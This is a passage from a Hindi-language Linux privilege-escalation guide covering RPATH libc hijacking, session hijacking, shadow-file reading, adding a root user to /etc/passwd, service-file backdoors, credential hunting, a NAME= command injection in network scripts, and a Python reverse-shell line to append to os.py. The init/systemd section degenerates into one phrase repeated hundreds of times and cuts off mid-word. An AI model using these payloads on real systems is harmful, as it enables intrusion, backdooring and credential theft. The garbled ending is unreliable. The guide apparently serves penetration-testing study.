{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
कॉपी करके लिब को `/var/tmp/flag15/` में डालने से यह प्रोग्राम इस स्थान पर उपयोग करेगा जैसा कि `RPATH` वेरिएबल में निर्दिष्ट किया गया है।
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
तो `/var/tmp` में `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` के साथ एक दुष्ट पुस्तकालय बनाएं।
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## क्षमताएँ

Linux capabilities एक **प्रक्रिया को उपलब्ध रूट विशेषाधिकारों का एक उपसेट प्रदान करते हैं**। यह वास्तव में रूट **विशेषाधिकारों को छोटे और विशिष्ट इकाइयों में विभाजित** करता है। इन इकाइयों में से प्रत्येक को प्रक्रियाओं को स्वतंत्र रूप से प्रदान किया जा सकता है। इस तरह पूरी सेट के विशेषाधिकारों को कम किया जाता है, जिससे शोषण के जोखिम कम होते हैं।\
Capabilities के बारे में और अधिक जानने के लिए निम्नलिखित पृष्ठ को **पढ़ें और उन्हें कैसे दुरुपयोग किया जा सकता है**:

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## निर्देशिका अनुमतियाँ

एक निर्देशिका में, **"क्रियान्वयन" के लिए बिट** इसका सूचित करता है कि प्रभावित उपयोगकर्ता "**cd**" फ़ोल्डर में जा सकता है।\
**"पढ़ने"** बिट इसका सूचित करता है कि उपयोगकर्ता **फ़ाइलें सूचीबद्ध** कर सकता है, और **"लिखने"** बिट इसका सूचित करता है कि उपयोगकर्ता **नई फ़ाइलें नष्ट** और **बना** सकता है।

## ACLs

पहुंच नियंत्रण सूची (ACLs) विशेषाधिकारों के पारंपरिक ugo/rwx अनुमतियों को **अधिरोहण करने की क्षमता रखते हैं**। ये अनुमतियाँ फ़ाइल या निर्देशिका पहुंच पर नियंत्रण बढ़ाती हैं जिसके द्वारा विशिष्ट उपयोगकर्ताओं को अधिकार देने या नकारने की अनुमति होती है जो मालिक या समूह का हिस्सा नहीं है। यह स्तर की **विस्तारणता सुनिश्चित करता है कि अधिक सटीक पहुंच प्रबंधन** हो। अधिक विवरण यहाँ [**मिल सकते हैं**](https://linuxconfig.org/how-to-manage-acls-on-linux)।

**"kali"** उपयोगकर्ता को एक फ़ाइल पर पढ़ने और लिखने की अनुमति दें:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**सिस्टम से** विशिष्ट ACLs वाले फ़ाइलें प्राप्त करें:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## ओपन शैल सेशन्स

**पुराने संस्करणों** में आप किसी अलग उपयोगकर्ता (**रूट**) के कुछ **शैल सेशन** को **हाइजैक** कर सकते हैं।\
**नवीनतम संस्करणों** में आप केवल **अपने उपयोगकर्ता** की स्क्रीन सेशन्स से **कनेक्ट** कर सकेंगे। हालांकि, आप सेशन के अंदर **रोचक जानकारी** पा सकते हैं।

### स्क्रीन सेशन्स हाइजैकिंग

**स्क्रीन सेशन्स की सूची**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
**एक सत्र से जुड़ें**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux सत्र हाइजैकिंग

यह **पुराने tmux संस्करणों** की समस्या थी। मैं एक गैर-विशेषाधिकारी उपयोगकर्ता के रूप में रूट द्वारा बनाई गई एक tmux (v2.1) सत्र को हाइजैक नहीं कर सका।

**tmux सत्रों की सूची**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../.gitbook/assets/image (131).png>)

**एक सत्र से जुड़ें**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
एचटीबी से वैलेंटाइन बॉक्स की जाँच के लिए एक उदाहरण।

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

सभी SSL और SSH कुंजी जो देवीयन आधारित सिस्टमों (उबंटू, कुबंटू, आदि) पर सितंबर 2006 से 13 मई 2008 तक उत्पन्न की गई हों, इस बग से प्रभावित हो सकती हैं।\
यह बग उस समय उत्पन्न होता है जब उन ओएस में एक नई SSH कुंजी बनाई जाती है, क्योंकि **केवल 32,768 विभिन्नताएँ संभव थीं**। इसका मतलब है कि सभी संभावनाएँ गणना की जा सकती हैं और **आपके पास SSH सार्वजनिक कुंजी होने पर आप उसके संबंधित निजी कुंजी की खोज कर सकते हैं**। आप यहाँ गणित संभावनाएँ देख सकते हैं: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH दिलचस्प विन्यास मान

* **PasswordAuthentication:** पासवर्ड प्रamanीकरण की अनुमति है या नहीं यह निर्धारित करता है। डिफ़ॉल्ट है `no`।
* **PubkeyAuthentication:** सार्वजनिक कुंजी प्रमाणीकरण की अनुमति है या नहीं यह निर्धारित करता है। डिफ़ॉल्ट है `yes`।
* **PermitEmptyPasswords**: जब पासवर्ड प्रमाणीकरण की अनुमति है, तो यह निर्धारित करता है कि सर्वर खातों में खाली पासवर्ड स्ट्रिंग के साथ लॉगिन की अनुमति देता है या नहीं। डिफ़ॉल्ट है `no`।

### PermitRootLogin

यह निर्धारित करता है कि क्या रूट SSH का उपयोग करके लॉग इन कर सकता है, डिफ़ॉल्ट है `no`। संभावित मान:

* `yes`: रूट पासवर्ड और निजी कुंजी का उपयोग करके लॉग इन कर सकता है
* `without-password` या `prohibit-password`: रूट केवल निजी कुंजी के साथ ही लॉग इन कर सकता है
* `forced-commands-only`: रूट केवल निजी कुंजी का उपयोग करके और यदि कमांड विकल्प निर्धारित हैं तो केवल लॉग इन कर सकता है
* `no` : नहीं

### AuthorizedKeysFile

उन पब्लिक कुंजियों को जिन्हें उपयोगकर्ता प्रमाणीकरण के लिए उपयोग किया जा सकता है, वह फ़ाइलें निर्धारित करती है। यह `%h` जैसे टोकन शामिल कर सकती है जो घर के निर्देशिका द्वारा प्रतिस्थापित किया जाएगा। **आप सटीक पथों की सूचना दे सकते हैं** (जो `/` से प्रारंभ होती हैं) या **उपयोगकर्ता के घर से संबंधित पथ**। उदाहरण के लिए:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
वह कॉन्फ़िगरेशन इसका संकेत देगा कि यदि आप "**testusername**" उपयोगकर्ता के **निजी** कुंजी के साथ लॉगिन करने का प्रयास करते हैं तो ssh आपकी कुंजी की सार्वजनिक कुंजी को `/home/testusername/.ssh/authorized_keys` और `/home/testusername/access` में स्थित कुंजियों के साथ तुलना करेगा

### ForwardAgent/AllowAgentForwarding

SSH एजेंट फॉरवर्डिंग आपको **अपनी स्थानीय SSH कुंजियों का उपयोग करने की अनुमति देता है** बजाय इसके कि कुंजियाँ (बिना पासफ्रेज़!) आपके सर्वर पर बैठी रहें। इसलिए, आप ssh के माध्यम से **एक होस्ट** पर **जंप** कर सकेंगे और वहां से अपने **प्रारंभिक होस्ट** में स्थित **कुंजी** का उपयोग करके **एक और** होस्ट पर **जंप** कर सकेंगे।

आपको इस विकल्प को `$HOME/.ssh.config` में इस प्रकार सेट करना होगा:
```
Host example.com
ForwardAgent yes
```
ध्यान दें कि यदि `Host` `*` है तो हर बार जब उपयोगकर्ता एक अलग मशीन पर जाता है, तो उस होस्ट को कुंजियों तक पहुंचने की अनुमति होगी (जो एक सुरक्षा समस्या है)।

फ़ाइल `/etc/ssh_config` इस **विकल्प** को **रद्द** कर सकती है और इस विन्यास को अनुमति देने या नकारने की अनुमति दे सकती है।\
फ़ाइल `/etc/sshd_config` ssh-agent forwarding को `AllowAgentForwarding` की कीवर्ड के साथ **अनुमति** या **नकारने** कर सकती है (डिफ़ॉल्ट अनुमति है)।

यदि आपको लगता है कि Forward Agent को कॉन्फ़िगर किया गया है तो निम्नलिखित पृष्ठ को पढ़ें क्योंकि **आप विशेषाधिकारों को बढ़ाने के लिए इसका दुरुपयोग कर सकते हैं**:

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## दिलचस्प फ़ाइलें

### प्रोफ़ाइल फ़ाइलें

फ़ाइल `/etc/profile` और `/etc/profile.d/` के तहत की फ़ाइलें **वे स्क्रिप्ट हैं जो एक उपयोगकर्ता नए शैली चलाते समय निष्पादित होती हैं**। इसलिए, यदि आप **किसी भी एक को लिखने या संशोधित कर सकते हैं तो आप विशेषाधिकारों को बढ़ा सकते हैं**।
```bash
ls -l /etc/profile /etc/profile.d/
```
यदि कोई अजीब प्रोफ़ाइल स्क्रिप्ट मिलता है तो आपको इसे **संवेदनशील विवरण** के लिए जांचना चाहिए।

### पासवर्ड/शैडो फ़ाइलें

आधारित ऑपरेटिंग सिस्टम पर `/etc/passwd` और `/etc/shadow` फ़ाइलें एक विभिन्न नाम का उपयोग कर सकती हैं या एक बैकअप हो सकता है। इसलिए सुझाव दिया जाता है कि **आप सभी उन्हें खोजें** और देखें कि **क्या आप पढ़ सकते हैं** ताकि आप देख सकें **कि क्या फ़ाइलों में हैश हैं**।
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
कई अवसरों पर आप `/etc/passwd` (या समकक्ष) फ़ाइल में **पासवर्ड हैश** पा सकते हैं।
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### लिखने योग्य /etc/passwd

पहले, निम्नलिखित कमांड्स में से किसी एक के साथ एक पासवर्ड उत्पन्न करें।
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
फिर उपयोगकर्ता `हैकर` जोड़ें और उसका उत्पन्न किया गया पासवर्ड जोड़ें।
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
उदा: `हैकर: $1 $हैकर $TzyKlv0/R/c28R.GAeLw.1:0:0:हैकर:/root:/bin/bash`

अब आप `su` कमांड का उपयोग `हैकर:हैकर` के साथ कर सकते हैं

वैकल्पिक रूप से, आप निम्नलिखित पंक्तियों का उपयोग करके एक डमी उपयोगकर्ता जोड़ सकते हैं बिना पासवर्ड के।\
चेतावनी: आप मशीन की वर्तमान सुरक्षा को कम कर सकते हैं।
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
**ध्यान दें:** BSD प्लेटफॉर्मों पर `/etc/passwd` को `/etc/pwd.db` और `/etc/master.passwd` में स्थानित किया जाता है, और `/etc/shadow` को `/etc/spwd.db` में नामांकित किया जाता है।

आपको यह जांचनी चाहिए कि क्या आप **कुछ संवेदनशील फ़ाइलों में लिख सकते हैं**। उदाहरण के लिए, क्या आप किसी **सेवा कॉन्फ़िगरेशन फ़ाइल** में लिख सकते हैं?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
उदाहरण के लिए, यदि मशीन **tomcat** सर्वर चल रहा है और आप **/etc/systemd/ के अंदर Tomcat सेवा कॉन्फ़िगरेशन फ़ाइल को संशोधित कर सकते हैं,** तो आप लाइनों को संशोधित कर सकते हैं:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
तुम्हारा बैकडोर अगली बार चलाया जाएगा जब टॉमकैट शुरू होगा।

### फोल्डर जांचें

निम्नलिखित फोल्डर बैकअप या दिलचस्प जानकारी रख सकते हैं: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (शायद आप आखिरी वाला नहीं पढ़ पाएंगे लेकिन कोशिश करें)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### अजीब स्थान/स्वामित्व वाली फ़ाइलें
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### पिछले मिनटों में संशोधित फ़ाइलें
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite डीबी फ़ाइलें
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### इतिहास, .sudo_as_admin_successful, प्रोफ़ाइल, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml फ़ाइलें
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### छिपे हुए फ़ाइलें
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **पाथ में स्क्रिप्ट/बाइनरी**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type -f -executable 2>/dev/null; done
```
### **वेब फ़ाइलें**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **बैकअप**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### ज्ञात फ़ाइलें जिनमें पासवर्ड हो सकता है

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) कोड पढ़ें, यह **कई संभावित फ़ाइलें खोजता है जिनमें पासवर्ड हो सकता है**।\
एक और दिलचस्प उपकरण जिसका उपयोग किया जा सकता है वह है: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) जो एक ओपन सोर्स एप्लिकेशन है जिसका उपयोग विंडोज, लिनक्स और मैक पर स्थानीय कंप्यूटर पर स्टोर किए गए कई पासवर्ड प्राप्त करने के लिए किया जाता है।

### लॉग

यदि आप लॉग पढ़ सकते हैं, तो आपको उनमें **दिलचस्प/गोपनीय जानकारी** मिल सकती है। जितना अजीब लॉग होगा, उतना ही दिलचस्प होगा (संभावना है)।\
इसके अलावा, कुछ "**बुरे**" कॉन्फ़िगर किए गए (बैकडोर?) **ऑडिट लॉग** आपको ऑडिट लॉग में पासवर्ड रिकॉर्ड करने की अनुमति देने की संभावना है जैसा कि इस पोस्ट में स्पष्ट किया गया है: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
जानकारी प्राप्त करने के लिए **ग्रुप** [**adm**](interesting-groups-linux-pe/#adm-group) बहुत ही सहायक होगा।

### शैल फ़ाइलें
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### सामान्य Creds खोज/रीजेक्स

आपको यह भी जांचना चाहिए कि क्या किसी फ़ाइल में शब्द "**पासवर्ड**" है उसके **नाम** में या **सामग्री** में, और लॉग्स में IPs और ईमेल्स या हैश regexps की भी जांच करें।\
मैं यहाँ सभी इसे कैसे करना है उसकी सूची नहीं दे रहा हूँ लेकिन अगर आप इसमें रुचि रखते हैं तो आप उन अंतिम जांचों की जांच कर सकते हैं जो [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) करता है।

## लिखने योग्य फ़ाइलें

### Python पुस्तकालय हाइजैकिंग

अगर आपको पता है कि किस **स्थान** से एक python स्क्रिप्ट को चलाया जा रहा है और आप उस फ़ोल्डर में लिख सकते हैं या आप **python पुस्तकालय को संशोधित** कर सकते हैं, तो आप ऑएस पुस्तकालय को संशोधित कर सकते हैं और उसे बैकडोर कर सकते हैं (अगर आप जहां python स्क्रिप्ट को चलाया जा रहा है वहां लिख सकते हैं, तो os.py पुस्तकालय की कॉपी और पेस्ट करें)।

पुस्तकालय को बैकडोर करने के लिए बस ऑएस पुस्तकालय के अंत में निम्नलिखित पंक्ति जोड़ें (IP और PORT बदलें):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### लॉगरोट शोषण

`लॉगरोट` में एक कमजोरी उन उपयोगकर्ताओं को लेने की अनुमति देती है जिनके पास एक लॉग फ़ाइल या उसके माता-पिता निर्देशिकाओं पर **लेखन अनुमतियाँ** हो सकती हैं। यह इसलिए है क्योंकि `लॉगरोट`, अक्सर **रूट** के रूप में चलता है, किसी भी फ़ाइल को अवश्यक रूप से निष्पादित करने के लिए बदला जा सकता है, विशेष रूप से निर्देशिकाओं जैसे _**/etc/bash_completion.d/**_ में। यह महत्वपूर्ण है कि आप केवल _/var/log_ में ही नहीं, बल्कि उस किसी भी निर्देशिका में भी जांचें जहाँ लॉग घूर्णन किया जाता है।

{% hint style="info" %}
यह कमजोरी `लॉगरोट` संस्करण `3.18.0` और पुराने पर प्रभावित करती है
{% endhint %}

इस कमजोरी के बारे में अधिक विस्तृत जानकारी इस पृष्ठ पर मिल सकती है: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

आप इस कमजोरी का शोषण कर सकते हैं [**logrotten**](https://github.com/whotwagner/logrotten).

यह कमजोरी [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** के लिए बहुत समान है, इसलिए जब भी आप पाते हैं कि आप लॉग को बदल सकते हैं, तो देखें कि वह लॉग कौन संचालित कर रहा है और यह जांचें कि क्या आप लॉग को साइमलिंक्स द्वारा अधिकार उन्नत कर सकते हैं।

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**कमजोरी संदर्भ:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

यदि, किसी कारणवश, एक उपयोगकर्ता किसी `ifcf-<whatever>` स्क्रिप्ट को _/etc/sysconfig/network-scripts_ में **लिखने** के लिए सक्षम है **या** वह एक मौजूदा को **समायोजित** कर सकता है, तो तो आपका **सिस्टम पून्ड** हो जाता है।

नेटवर्क स्क्रिप्ट, _ifcg-eth0_ उदाहरण के लिए नेटवर्क कनेक्शन के लिए उपयोग किए जाते हैं। वे .INI फ़ाइलों के रूप में दिखते हैं। हालांकि, ये लिनक्स पर नेटवर्क प्रबंधक (डिस्पैचर.d) द्वारा \~स्रोतित\~ किए जाते हैं।

मेरे मामले में, इन नेटवर्क स्क्रिप्ट में `NAME=` विशेषता को सही ढंग से संभाला नहीं गया है। यदि आपके पास नाम में **सफेद/खाली जगह है तो सिस्टम को खाली जगह के बाद का हिस्सा निष्पादित करने की कोशिश करता है**। इसका मतलब है कि **पहले खाली जगह के बाद का हर कुछ रूट के रूप में निष्पादित किया जाता है**।

उदाहरण के लिए: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
### **आरंभ, आरंभ.डी, सिस्टमडी, और आरसी.डी**

डायरेक्टरी `/etc/init.d` सिस्टम वी इनिट (SysVinit), क्लासिक लिनक्स सेवा प्रबंधन सिस्टम के लिए **स्क्रिप्ट्स** का घर है। इसमें सेवाओं को `शुरू`, `रोकें`, `पुनः आरंभ` और कभी-कभी `रीलोड` करने के लिए स्क्रिप्ट्स शामिल हैं। इन्हें सीधे या `/etc/rc?.d/` में पाए गए प्रतीकात्मक लिंक के माध्यम से क्रियान्वित किया जा सकता है। रेडहैट सिस्टम्स के लिए एक वैकल्पिक पथ `/etc/rc.d/init.d` है।

वहीं, `/etc/init` **अपस्टार्ट** के साथ जुड़ा है, जो उबुंटू द्वारा पेश किए गए एक नए **सेवा प्रबंधन** है, सेवा प्रबंधन कार्यों के लिए कॉन्फ़िगरेशन फ़ाइलों का उपयोग करता है। अपस्टार्ट में जाने के बावजूद, उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति के लिए उपस्थिति क
